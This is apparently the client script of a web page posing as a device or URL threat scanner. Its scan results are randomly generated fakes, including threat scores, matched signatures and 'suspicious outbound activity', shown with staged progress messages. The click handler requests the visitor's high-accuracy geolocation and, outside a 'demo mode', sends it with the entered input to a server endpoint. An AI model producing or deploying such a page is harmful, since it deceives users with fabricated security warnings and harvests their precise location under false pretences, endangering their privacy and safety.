// public/scripts.js (force/location-friendly version)
// This version WILL request location on click (user gesture).
// If "Simulation mode" is ON, we still request permission so the browser prompt appears,
// but we will NOT send the location to the server while in simulation mode.

const analyzeButton = document.getElementById('analyzeButton');
const videoUrlInput = document.getElementById('videoUrlInput');
const demoToggle = document.getElementById('demoToggle');
const statusText = document.getElementById('status');
const progressBar = document.getElementById('progressBar');
const progressBarContainer = document.getElementById('progressBarContainer');
const resultArea = document.getElementById('resultArea');
const simLabel = document.getElementById('simLabel');

function randInt(min, max){ return Math.floor(Math.random()*(max-min+1))+min; }
function pick(arr){ return arr[Math.floor(Math.random()*arr.length)]; }

function makeFakeScanResults(input){
  const deviceConfidence = `${randInt(85,99)}%`;
  const threatScore = randInt(0,100);
  const threatLevel = threatScore < 20 ? 'Low' : threatScore < 60 ? 'Medium' : 'High';
  const signaturesMatched = randInt(0,5);
  const suspiciousProcesses = randInt(0,3);
  const networkAnomalies = pick(['None detected','Suspicious outbound activity','Potential DNS tunneling','Unknown remote host observed']);
  const recommendations = [
    'Keep your OS up to date',
    'Run full antivirus scan with official vendor',
    'Avoid installing unknown apps',
    'Change device credentials if suspicious'
  ];
  return {
    deviceConfidence, threatScore, threatLevel, signaturesMatched, suspiciousProcesses, networkAnomalies,
    recommendations: pick(recommendations)
  };
}

async function runScanFlow(input, isDemo){
  resultArea.innerHTML = '';
  simLabel.style.display = isDemo ? 'block' : 'none';
  statusText.textContent = '';
  progressBar.style.width = '0%';
  progressBarContainer.style.display = 'block';

  const stages = [10, 35, 60, 85, 100];
  for (let i=0;i<stages.length;i++){
    progressBar.style.width = stages[i] + '%';
    statusText.textContent = ['Initializing scanner...','Collecting device metadata...','Analyzing signatures...','Checking network & processes...','Finalizing results...'][i];
    await new Promise(r => setTimeout(r, 600 + Math.random()*400));
  }

  const results = makeFakeScanResults(input);

  const html = `
    <div class="result-box">
      <div style="display:flex;justify-content:space-between;align-items:center">
        <strong>Scan Summary</strong>
        <span class="muted">Confidence: ${results.deviceConfidence}</span>
      </div>
      <div style="margin-top:8px">
        <div><strong>Threat Score:</strong> ${results.threatScore} / 100</div>
        <div><strong>Threat Level:</strong> ${results.threatLevel}</div>
        <div><strong>Signatures Matched:</strong> ${results.signaturesMatched}</div>
        <div><strong>Suspicious Processes:</strong> ${results.suspiciousProcesses}</div>
        <div><strong>Network:</strong> ${results.networkAnomalies}</div>
      </div>
      <div style="margin-top:10px;padding-top:10px;border-top:1px dashed rgba(255,255,255,0.03)">
        <strong>Recommended action:</strong>
        <div class="muted" style="margin-top:6px">${results.recommendations}</div>
      </div>
    </div>
  `;

  resultArea.innerHTML = html;
  statusText.textContent = isDemo ? 'Demo scan finished — results are simulated.' : 'Quick scan finished.';
  progressBarContainer.style.display = 'none';
  progressBar.style.width = '0%';
}

/**
 * Request location from browser. Returns {latitude, longitude, accuracy} or null.
 * This MUST be called inside a user gesture (click).
 */
function requestLocationWithPrompt(timeout = 8000) {
  return new Promise((resolve) => {
    if (!("geolocation" in navigator)) {
      console.warn('Geolocation not supported by browser.');
      return resolve(null);
    }

    let resolved = false;
    const onSuccess = (pos) => {
      if (resolved) return;
      resolved = true;
      resolve({
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy
      });
    };
    const onError = (err) => {
      if (resolved) return;
      resolved = true;
      console.warn('Geolocation error/denied:', err && err.message);
      resolve(null);
    };

    navigator.geolocation.getCurrentPosition(onSuccess, onError, {
      enableHighAccuracy: true,
      timeout: timeout,
      maximumAge: 0
    });

    // Fallback: if neither success nor error after (timeout + 1s), resolve null
    setTimeout(() => {
      if (!resolved) {
        resolved = true;
        console.warn('Geolocation fallback timeout.');
        resolve(null);
      }
    }, timeout + 1000);
  });
}

analyzeButton.addEventListener('click', async () => {
  const input = videoUrlInput.value.trim();
  if (!input) {
    statusText.textContent = 'Please enter a Device ID or URL.';
    return;
  }

  const isDemo = demoToggle.checked;

  // Always trigger permission prompt on click (so user sees browser dialog),
  // but if demo mode is ON we will NOT forward location to server.
  let locationData = null;
  try {
    // This call is inside click handler -> should trigger browser permission dialog.
    locationData = await requestLocationWithPrompt(8000);
    console.log('Location result (may be null):', locationData);
  } catch (e) {
    console.error('Location request failed:', e);
    locationData = null;
  }

  // Show scan UI
  runScanFlow(input, isDemo);

  // If demo mode is enabled -> do NOT send real location to server.
  if (isDemo) {
    console.log('Demo mode ON — location will NOT be sent to server.');
    return;
  }

  // Non-demo -> send to server
  try {
    const res = await fetch('/api/send-data', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ videoUrl: input, location: locationData })
    });
    if (!res.ok) {
      console.warn('Server responded with non-OK status', res.status);
    } else {
      console.log('Data successfully sent to server.');
    }
  } catch (err) {
    console.error('Failed to send to server', err);
  }
});
